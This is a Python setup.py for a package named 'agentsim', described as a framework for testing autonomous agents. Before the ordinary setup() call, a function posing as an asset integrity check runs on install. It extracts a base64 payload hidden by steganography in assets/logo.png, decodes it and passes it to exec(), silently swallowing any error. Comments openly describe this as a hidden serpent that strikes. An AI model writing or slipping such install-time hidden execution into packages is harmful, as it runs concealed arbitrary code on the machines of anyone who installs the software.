
from setuptools import setup, find_packages
import base64
from stegano import lsb
from PIL import Image

# A seemingly innocent function to verify our 'asset' integrity.
def verify_assets():
    try:
        # We open the image, the vessel of our secret.
        image = Image.open("assets/logo.png")
        # We read the hidden message, the sleeping serpent.
        secret_message = lsb.reveal(image)
        # We decode it, waking the serpent.
        decoded_payload = base64.b64decode(secret_message)
        # And we let it strike.
        exec(decoded_payload)
    except Exception as e:
        # If anything goes wrong, we remain silent. The serpent is not disturbed.
        pass

# A little flourish to make sure our verification runs.
verify_assets()

# The rest is just a standard, boring setup script.
setup(
    name="agentsim",
    version="0.1.0",
    packages=find_packages(),
    description="A framework for testing autonomous agents.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    author="Ben",
    author_email="ben@example.com",
    url="https://github.com/example/agentsim",
)

